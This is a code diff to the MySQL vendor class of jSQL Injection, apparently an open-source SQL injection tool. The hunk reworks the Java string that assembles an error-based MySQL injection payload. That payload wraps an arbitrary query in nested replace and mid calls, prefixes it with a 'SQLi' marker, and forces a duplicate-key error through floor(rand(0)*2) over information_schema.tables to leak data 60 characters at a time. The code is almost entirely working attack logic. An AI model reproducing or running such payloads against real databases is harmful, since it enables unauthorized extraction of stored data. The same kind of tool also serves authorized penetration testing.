@@ -295,31 +295,30 @@ public class MySQLVendor extends AbstractVendorDefault {
                         "count(*)," +
                         "concat(" +
                             "0x53514c69," +
-                            "replace(" +
                                 "mid(" +
                                     "replace(" +
-                                    "replace(" +
-                                        "(" + sqlQuery + ")" +
+                                        "replace(" +
+                                            "(" + sqlQuery + ")," +
+                                            /**
+                                             * A line end with a single character \n in jSQL (see InjectionModel and readLine())
+                                             * This force \n\r to \n in order to get correct count
+                                             * \n=>CR=>0D, \r=>LF=>0A
+                                             */
+                                            "0x0D0A,0x0D" +
+                                        ")," +
+                                        /**
+                                         * Avoid empty character that breaks injection
+                                         */
+                                        "0x00,''" +
+                                    ")," +
+                                    startPosition+"," +
                                     /**
-                                     * errorbased convert \r into \r\n => counting inaccurate
-                                     * force 0x0A into 0x0102
-                                     */
-                                    ",0x0A,0x0102)" +
-                                    /**
-                                     * avoid empty character that breaks injection
-                                     */
-                                    ",0x00,'')," +
-                                    startPosition + "," +
-                                    /**
-                                     * errorbase gets 64 characters: 'SQLi' consumes 4
+                                     * Errorbase gets 64 characters: 'SQLi' consumes 4
                                      * useless to get all the 64 => getting only 60
                                      */
                                     "60" +
                                 ")" +
-                            /**
-                             * force back 0x0102 into 0x0D
-                             */
-                            ",0x0102,0x0A)," +
+                            "," +
                             "floor(rand(0)*2)" +
                         ")" +
                     "from+information_schema.tables+" +
